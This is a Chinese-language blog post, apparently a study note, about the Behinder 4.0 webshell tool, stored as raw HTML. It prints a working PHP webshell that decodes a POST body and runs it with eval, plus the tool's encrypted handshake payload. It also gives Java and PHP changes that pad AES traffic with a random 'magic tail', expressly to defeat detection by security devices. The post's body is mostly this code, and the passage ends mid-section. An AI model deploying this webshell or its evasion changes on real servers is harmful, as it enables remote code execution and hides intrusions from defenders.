@@ -1,0 +1,331 @@
+<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Webshell工具学习 | Pale</title><meta name="keywords" content="工具"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Behinder4.0v4.0相对于3.0版本，更新了较多内容，其中包括了开放了传输协议的自定义功能 aes特征一直是厂商查杀的重点，在主机层，aes相关的API也是一个强特征 4.0泛化这个特征提供了传输协议自定义功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。 v4.0版本不再有连接密码的概念，你的自定义传输协议的算法就是连接密码 工作流程  123451本地对Payl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell工具学习">
+<meta property="og:url" content="http://example.com/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="Pale">
+<meta property="og:description" content="Behinder4.0v4.0相对于3.0版本，更新了较多内容，其中包括了开放了传输协议的自定义功能 aes特征一直是厂商查杀的重点，在主机层，aes相关的API也是一个强特征 4.0泛化这个特征提供了传输协议自定义功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。 v4.0版本不再有连接密码的概念，你的自定义传输协议的算法就是连接密码 工作流程  123451本地对Payl">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2023-01-21T05:30:21.000Z">
+<meta property="article:modified_time" content="2023-03-21T05:31:37.073Z">
+<meta property="article:author" content="One">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Webshell工具学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2023-03-21 13:31:37'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Webshell工具学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-01-21T05:30:21.000Z" title="Created 2023-01-21 13:30:21">2023-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-21T05:31:37.073Z" title="Updated 2023-03-21 13:31:37">2023-03-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Webshell工具学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Behinder4-0"><a href="#Behinder4-0" class="headerlink" title="Behinder4.0"></a>Behinder4.0</h2><p>v4.0相对于3.0版本，更新了较多内容，其中包括了开放了传输协议的自定义功能</p>
+<p>aes特征一直是厂商查杀的重点，在主机层，aes相关的API也是一个强特征</p>
+<p>4.0泛化这个特征提供了传输协议自定义功能，<strong>让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。</strong></p>
+<p><strong>v4.0版本不再有连接密码的概念，你的自定义传输协议的算法就是连接密码</strong></p>
+<p>工作流程</p>
+<p><img src="640.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1本地对Payload进行加密，然后通过POST请求发送给远程服务端；</span><br><span class="line">2服务端收到Payload密文后，利用解密算法进行解密；</span><br><span class="line">3服务端执行解密后的Payload，并获取执行结果；</span><br><span class="line">4服务端对Payload执行结果进行加密，然后返回给本地客户端；</span><br><span class="line">5客户端收到响应密文后，利用解密算法解密，得到响应内容明文</span><br></pre></td></tr></table></figure>
+
+<p>前三步的基础是 shell.php，通过 post 请求传 body</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">	function decrypt($data)</span><br><span class="line">&#123;</span><br><span class="line">    $key=&quot;25f9e794323b4538&quot;; </span><br><span class="line">    $bs=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">	$after=$bs($data.&quot;&quot;);</span><br><span class="line">	for($i=0;$i&lt;strlen($after);$i++) &#123;</span><br><span class="line">    	$after[$i] = $after[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">    return $after;</span><br><span class="line">&#125;</span><br><span class="line">	$post=Decrypt(file_get_contents(&quot;php://input&quot;));</span><br><span class="line">    eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>在第一次传输的时候，做了密钥协商与指纹确认的事情，冰蝎需要先确定你（受攻击端）确实是能够和我（本地攻击者）进行加解密，或者说可以进行数据传输，这也就是第一次发包。</p>
+<p>对应的代码如下，这是冰蝎当中 payload/php 下的代码 ———— Echo.php</p>
+<p><img src="4fbadde1968e8754d4e208b9eb7961f0.png" alt="img"></p>
+<p>在实际传输过程中会发现冰蝎发包时多了一个 <code>encrypt()</code> 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function main($content)</span><br><span class="line">&#123;</span><br><span class="line">    $result = array();</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode($content);</span><br><span class="line">    @session_start();    //初始化session，避免connect之后直接background，后续get result无法获取cookie</span><br><span class="line">    echo encrypt(json_encode($result));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data)</span><br><span class="line">&#123;    </span><br><span class="line">    $key=&quot;25f9e794323b4538&quot;; </span><br><span class="line">    for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">        $data[$i] = $data[$i]^$key[$i+1&amp;15];     </span><br><span class="line">    &#125;    </span><br><span class="line">    $bs=&quot;base64_&quot;.&quot;encode&quot;;</span><br><span class="line">    $after=$bs($data.&quot;&quot;);    </span><br><span class="line">    return $after;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content=&quot;WWtpektNWU1PREpybFB6VlQwdXY1T2JoMkNsMzVmZmVPZ0pDQnZaZElKejhVaGc1ZU42NnlCYWI3YVVqakJ4U3BRcnpneEdJT3pmclR5QWFVQ2Nqa2pTVm1OTU9LNzlrNHhzRjJjd2F2OTF2WFRITG9KdWpmMHpFeU9lTmFWRmdYQUdPT0loaHJKM0JSMkZNaUo5VjZwWGtwb2xQUWNyWGY1UzBuV05SYkE5eHFacmZUM3B4UG1jR3l2RTcxUUtCSkhMa0NJdms5NzdYM2FmZWFmazd4bkpHYlc0MVloNWV4YUp5Q05MTEZVemVaQkNOOUVvUjhNell4cUY3NzJFenp3bXFPbVQ1emxPNjVDUE5DR2JGVzlpc1k2MVlMTVY5WHBKYzRrdjVjcEJmU3NGTkRFbHhvM282MlZvV1FGUjRqTHY3eVY5am9BUVRLcFRiaWVmTmJuQVJidmJQZmlNeFhKTm9QbzVMZWNmNDIxNlZNY000cXJySzVYeEY3ajA1TlpWd3R6MExZZUdNaXlWTmE3bzgyb0xQVVk3ZThaaUhta0x6OVdnbVd5SmpIUVQ5UWhORm8ybVRtNTZPMDhIRHpyMkVhRmpYd3YyWWQ4SjZCZjdHWEtNTGo1OXpHdEgxb2Nqa2dyTHpUMWcwaGtSeTZaRVdyY2NRaEJOZHVwcTlvME9wY1loYTNiSXU0c1lkQk04OFNSaDJGUUxxR0k1TzdIMWVvN0NJTjRRSmpvbUtqMXVVWEFwREVHeGFCMlJZdXU5VWh1MHJwMkdESEdkUHVzaEJBTEdwYUJjZkRBR0ZacjF6ME5XQlBJcnNMS2NoZ2NsNEdFZkY0YmJCVkR1ZXo0bFV3Tm1wc1pzQ0FqRWNDTXNkWmtBUUJwb3Y5YndOTW9peWVSVUcwTUVUQjdYZ096YjVxQjFMaHByWVV2OFV3N1pGNFJYQkNZcnlCd0xHckdkbjVMaHdIazFNVUxvRkpoU0dPaURlRzAzMnhZbEM5ekRjVmUxMlhkbFMwa2YxVGJRUzlyck5OSDF2TzNKZ1NiOTJ2NkhjMWxXaWxJVDlLa1hwVnFZOEhEc1U4bVg4MHF0bktsbkdCcHVsRUUyb2djZlkwR2FVY1RxM09aZXFMeUtlNWFBdzNhTEM2VlFrZFI2MHZwVENlZ1ZMWTBiN3lOTHBMN3A4TmFVMHVOUmNaNXl6cTRQSEhJNk5UakltTEhDUzlPRTREeUtGcm0xbk1KOUdPZEJsdEljOG5FclNiVFl2Q1padkY3YlNnYmhsanEwbWphem1vb21wWld0ZWlCSjM5NGxlbEpYWVVHWFN3dzIyOVd5SzZBdUNZSEU3S3V0TERHbWhCbnI1b0RScm1ySFh6bmx1aDUwTm4wb09ZZDYwTDFNcnpiQzJuQTdXOWVSRk45M0drc2p0MDhRSTByaW1QbDg3Ykw2MmZid0RXcFRxZjhwa3E3eXJWZ0p0N3Z0WVdHeVVxd0lnaE9ibVI4b1pvR0tiTFpOTW53akZlcDJ4ZWVzMnF2dktwTDBkNVZCblhiMmhhcHkzdFplOXpJQVpzWHE5OFFSTTJSUzMzWkt0cXhERWZLWElpcnh4aEhhZndyc1Q4OVN4bUVGUTVTOThsM016dDMwR0JMbUxENnNLQmZLYkQ4ekRRU0xJdGo5ME41Zzg2eng4NjRTeURBa0hPTGJYUnVISWRJeE1Manp6aTV6YjNnbENwTTFXenpVZVlacExyVW13QXJrTEJaanFhQTdQZTlUZWY2ZlJURWhwQmNxUUE2N09ZZnduVFB3akdwazY3Q2wxS3ZmSzFOeDRWQVRVR2tGZjY1enZoa0NDWVNqYWVGN0hCUFEzc3lJa2puVUI3TEdZSERVNDVVNHI1ZUxOTGVCc0Fhb1NSeUtuT3RCQ3Jsd05HTWxGejFYclZkc0NRMUIwWXRGS3FUd25NZVVmd3NzcGdPZWNFTW0xYnd3WnJKVlZSVG0zY29ZWk5HellrZExCS011WFN5dWVaRFVnc1dDWFdRTlJNcmUyVWJXa0hvYnA5QmF5U25GZ01MaXVKV2pXNFRqek9mekFJa2h2c2FwNlF4VTBjVVZxNXJhaGJGaW9VYTREVERPbTJoS055bk1uQWdVTnZFR1BUNXR2eWNQWEpVa2R4em9yb3dMc2RzY2dWYldGMXFSdEJKc0xQQlJsZ2Y4OWE4QWUxUHNqNms1OE9CRGhBMzRiOERYMTJ4OTZDYUNzZFBWMlJFWFEzdENHSFdZblJNb1FOclFSdXhZZjhPQmVNVm9IUjBiblJnV0RLWGI3ZWZhc2owYUl4Q1c2eDNRQkdQTXNsQmtoQW5UUnVYc0xFRGN5eENlNjBDdHhXN3hpaHA5Skc3S2tKbW5PUlNneWZiYXRvZG9EMHVHajhCQUYzRThuM3NHbVNCdEFkdk9OWjB0T3BPUVgzaW10Rks1QUFTeGJ4RHZZTGM4d2RBQXI4ZmUxQU5kRmVJUGhiUWxha0hIUmp3bmVhNnpNcTA4R0ZreFFPTFhOOExSMlZVdlBUYlowV1FPUXh0azhQVW0zaVM3YkhaeVAzVzdsVkJ0N2EwQjE5aUJicWkxbjNQenpLdWhURXJKTzE5Mm5JemxOREpTQm55cUJ4U0IwcERjZ0RoWHFQdG42VHAzQkh4eEJWUzVpVFczU1FPeHlVVmwydGdoWVphb3NzTGlsWWdVcnVBMEQwYjdKVlpqZ1lMV0dhcmdrZjZpa3dVSDNWZVZlN0FIemZWRHdJVFlpUTNPOFJSUjkwOEwwWkp0Y1ZSUzBZMWYwMDBQaHFSWGE2aDhpZWpnWXQ1V3UzWlZYZ1BJM0N3c1ZnVVB0eElWM0xUMHkyV3VDcDJLc2RDVEQyRXBKMzVKUnpCTWd3dTFhajBvaWlyaXBGY04zbmpyQjBESE1Xck5tMFRNUWZvTU9uSTYzcXhxTE1kcngyelhmTlFmbTNKTWRKTDRONUtYSXZRYmI4Q090bHNsVG1oRmVMbEQzUWFWTmJEYUxXdEZhRTltNHdIRHl2eGM3b3lGVHBZYWdWTUNHM3BrMVJscTM2OFRYS1RhSmRTYVgyNmcyalhZNjBjb0RZalJ3QkpPWVlkb01DUzVoRGY3SWdZSkNNMUxLenlXZEtQSUtDaUpoTnQ5S2FXNlFnR0pNZUxxUVJ3R0FnNDQ3cmc1M2c0a1ptSW5oNDBTbGFpQnB3a3p5MWVnb0JvVXhZa2FOZnVJTGFvNXhZb2FYOHRZTjhBNHlxTjlJRWszY0tuVVNqTjRST0RMUHh0ZGlHRnNWSWxabkpQVFVjUnVyclRWbGV3SE05UXVydU14d1hXdjdHT205cjdISG9sOUsxbUExNDh4bGMzZU5IeVl3VmJRVHFoeUlWZGQ5b0JMeTlqOXZ0UkFnV250TE5tWmtZRUxvbXdHV0xUN2k5MnJGZ2VLZERPd1M1ZUtsVg==&quot;;</span><br><span class="line">$content=base64_decode($content);</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure>
+
+<p>在这一次内容传输结束之后，冰蝎确认被攻击端与本地可以建立传输，才会发第二次包，也就是执行 <code>phpinfo()</code> 命令，代码略。</p>
+<p>接着</p>
+<ul>
+<li>4、服务端对 Payload 执行结果进行加密，然后返回给本地客户端；</li>
+<li>5、客户端收到响应密文后，利用解密算法解密，得到响应内容明文。</li>
+</ul>
+<p><strong>一个传输协议必须包含一对本地加解密函数，至少包含一对远程加解密函数（Java、PHP、C#、ASP中的一个或者多个）。</strong></p>
+<blockquote>
+<p>.传输协议的加解密函数名称分别为Encrypt和Decrypt，且都只有一个入参，参数类型为二进制字节流。在函加密数体内可以对字节流做任何加密，比如aes、rsa或者各种封装、拼接、自定义算法等等，最终将加密结果返回。在解密函数中利用对称算法将加密函数的结果进行解密，并将解密结果返回。为了能清晰展示传输协议的结构，上图中的传输协议其实未做任何加解密处理，直接将入参返回，是一个纯明文的传输协议。</p>
+</blockquote>
+<h3 id="冰蝎马的改写与绕过-tips"><a href="#冰蝎马的改写与绕过-tips" class="headerlink" title="冰蝎马的改写与绕过 tips"></a>冰蝎马的改写与绕过 tips</h3><p>作者提出了一种非常巧妙的绕过方式</p>
+<blockquote>
+<p>在 AES 加密的时候增加一个小尾巴，这个尾巴存在自定义的可能性，也就让很多设备难以进行检测了。</p>
+</blockquote>
+<h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p>本地默认的 aes 传输协议加密算法如下：</p>
+<pre><code>private byte[] Encrypt(byte[] data) throws Exception
+&#123;
+    String key=&quot;e45e329feb5d925b&quot;;
+    byte[] raw = key.getBytes(&quot;utf-8&quot;);
+    javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, &quot;AES&quot;);
+    javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);// &quot;算法/模式/补码方式&quot;
+    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);
+    byte[] encrypted = cipher.doFinal(data);
+    Class baseCls;
+    try
+    &#123;
+        baseCls=Class.forName(&quot;java.util.Base64&quot;);
+        Object Encoder=baseCls.getMethod(&quot;getEncoder&quot;, null).invoke(baseCls, null);
+        encrypted= (byte[]) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);
+    &#125;
+    catch (Throwable error)
+    &#123;
+        baseCls=Class.forName(&quot;sun.misc.BASE64Encoder&quot;);
+        Object Encoder=baseCls.newInstance();
+        String result=(String) Encoder.getClass().getMethod(&quot;encode&quot;,new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);
+        result=result.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);
+        encrypted=result.getBytes();
+    &#125;
+    return encrypted;
+&#125;
+</code></pre>
+<p>服务端是 PHP，使用默认的 aes 算法，但是由于默认使用的是 aes128 的算法，会导致密文长度恒是 16 的整数倍，流量设备可能通过这个特征来对冰蝎做流量识别，我现在想对默认算法做一个简单修改，在密文最后最加一个 magic 尾巴，随机产生一个随机长度的额外字节数组</p>
+<p>修改后<strong>本地</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">private byte[] Encrypt(byte[] data) throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    String key=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">    byte[] raw = key.getBytes(&quot;utf-8&quot;);</span><br><span class="line">    javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">    javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);// &quot;算法/模式/补码方式&quot;</span><br><span class="line">    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);</span><br><span class="line">    byte[] encrypted = cipher.doFinal(data);</span><br><span class="line">    Class baseCls;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        baseCls=Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object Encoder=baseCls.getMethod(&quot;getEncoder&quot;, null).invoke(baseCls, null);</span><br><span class="line">        encrypted= (byte[]) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Throwable error)</span><br><span class="line">    &#123;</span><br><span class="line">        baseCls=Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">        Object Encoder=baseCls.newInstance();</span><br><span class="line">        String result=(String) Encoder.getClass().getMethod(&quot;encode&quot;,new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;encrypted&#125;);</span><br><span class="line">        result=result.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;);</span><br><span class="line">        encrypted=result.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    //增加魔法尾巴</span><br><span class="line">    int magicNum=Integer.parseInt(key.substring(0,2),16)%16;</span><br><span class="line">    java.util.Random random=new java.util.Random();</span><br><span class="line">    byte[] buf=new byte[magicNum];</span><br><span class="line">    for (int i=0;i&lt;buf.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i]=(byte)random.nextInt(256);</span><br><span class="line">    &#125;</span><br><span class="line">    java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream();</span><br><span class="line">    output.write(encrypted);</span><br><span class="line">    output.write(buf);</span><br><span class="line">    return output.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>远程</strong></p>
+<p>由于我们目前假设的是一个 PHP 的目标环境，远程加密函数采用 PHP 格式编写，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Encrypt($data)  </span><br><span class="line">&#123;  </span><br><span class="line">	$key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond  </span><br><span class="line">	$encrypted=base64_encode(openssl_encrypt($data, &quot;AES-128-ECB&quot;, $key,OPENSSL_PKCS1_PADDING));  </span><br><span class="line">	$magicNum=hexdec(substr($key,0,2))%16; //根据密钥动态确定魔法尾巴的长度  </span><br><span class="line">	for($i=0;$i&lt;$magicNum;$i++) &#123;  </span><br><span class="line">		$encrypted=$encrypted.chr(mt_rand(0, 255)); //拼接魔法尾巴  </span><br><span class="line">	&#125;  </span><br><span class="line">	return $encrypted;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解密算法</strong><br>在加密算法中，我们在原版 aes 的基础上，在密文最后追加了一段魔法尾巴，尾巴长度为秘钥的前两位十六进制对应的数值对 16 取模的值。在解密时，我们只需要在原版 aes 解密函数的基础上，把密文最后的尾巴截掉即可。分别对 Java 版本和 PHP 版本的解密函数做修改。<br><strong>本地</strong></p>
